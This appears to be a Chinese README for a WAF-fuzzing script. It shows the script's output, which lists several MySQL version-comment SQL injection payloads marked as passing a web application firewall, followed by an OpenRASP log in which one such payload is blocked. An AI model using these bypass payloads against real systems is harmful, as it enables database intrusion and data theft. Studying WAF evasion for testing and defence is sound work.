# waf-fuzz-example

[来自 FreeBUF: Fuzz自动化Bypass软WAF姿势](http://www.freebuf.com/sectool/161808.html)

# 测试方法

修改 `main.py`，修改你的模板和服务器地址，即可复现。根据作者思路重写了下代码，方便后面改造

```
%> python main.py
[PASS] http://172.16.177.120/mysql.php?id=-1/*!union/*!/*!/*!/*!select*/1,0x41424344
[PASS] http://172.16.177.120/mysql.php?id=-1/*!union/*!/*!/*!+select*/1,0x41424344
[PASS] http://172.16.177.120/mysql.php?id=-1/*!union/*!/*!/*!%0aselect*/1,0x41424344
[PASS] http://172.16.177.120/mysql.php?id=-1/*!union/*!/*!/*!%0bselect*/1,0x41424344
[PASS] http://172.16.177.120/mysql.php?id=-1/*!union/*!/*!/*!%0cselect*/1,0x41424344
[PASS] http://172.16.177.120/mysql.php?id=-1/*!union/*!/*!/*!%0dselect*/1,0x41424344
```

# 写在最后

当然，这个工具只能 Fuzz WAF，生成的测试规则都无法绕过 [OpenRASP](https://rasp.baidu.com) 的算法#2

```
{"referer":"","attack_type":"sql","intercept_state":"block","plugin_confidence":100,"plugin_name":"java_builtin_plugin","server_version":"7.0.78","server_hostname":"devnull","url":"http://127.0.0.1:8080/mysql/?id\u003d1/*!union/*!/*!/**/.select*/1,0x41424344","target":"127.0.0.1","path":"/mysql/","event_type":"attack","attack_params":{"mysql_connection_id":"104","server":"mysql","query":"SELECT * FROM users WHERE id \u003d 1/*!union/*!/*!/**/.select*/1,0x41424344"},"server_ip":"127.0.0.1","stack_trace":"com.mysql.jdbc.StatementImpl.executeQuery(StatementImpl.java)\norg.apache.jsp.index_jsp.runQuery(index_jsp.java:28)\norg.apache.jsp.index_jsp._jspService(index_jsp.java:127)\norg.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\norg.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439)\norg.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395)\norg.apache.jasper.servlet.JspServlet.service(JspServlet.java:339)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:110)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:506)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:962)\n","attack_source":"127.0.0.1","request_id":"02cf3e7b34e64243bd0c1548ee135601","event_time":"2018-02-09T22:50:47","plugin_message":"禁止MySQL版本号注释","user_agent":"python-requests/2.11.1","server_type":"Tomcat"}
```

